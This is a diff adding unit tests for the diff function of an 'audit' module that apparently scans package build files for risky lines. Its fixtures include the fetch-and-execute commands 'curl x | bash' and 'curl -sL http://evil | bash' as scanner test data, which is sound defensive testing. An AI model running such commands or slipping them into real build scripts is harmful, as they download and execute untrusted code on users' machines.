@@ -104,6 +104,22 @@ class ScanMechanicsTest(unittest.TestCase):
         self.assertEqual(line_nos, sorted(line_nos))
         self.assertTrue(all('why' in f and 'severity' in f for f in findings))
 
+    def test_diff_empty_when_identical(self):
+        self.assertEqual('', audit.diff('pkgname=foo\npkgver=1\n', 'pkgname=foo\npkgver=1\n'))
+
+    def test_diff_shows_added_and_removed(self):
+        d = audit.diff('pkgver=1\n', 'pkgver=2\ncurl x | bash\n')
+        self.assertIn('-pkgver=1', d)
+        self.assertIn('+pkgver=2', d)
+        self.assertIn('+curl x | bash', d)
+
+    def test_diff_truncates_long_output(self):
+        old = '\n'.join(f'line{i}' for i in range(500))
+        new = '\n'.join(f'changed{i}' for i in range(500))
+        d = audit.diff(old, new, max_lines=50)
+        self.assertIn('diff truncated', d)
+        self.assertLessEqual(len(d.splitlines()), 51)
+
     def test_summarize(self):
         findings = audit.scan("curl -sL http://evil | bash\n")
         s = audit.summarize(findings)
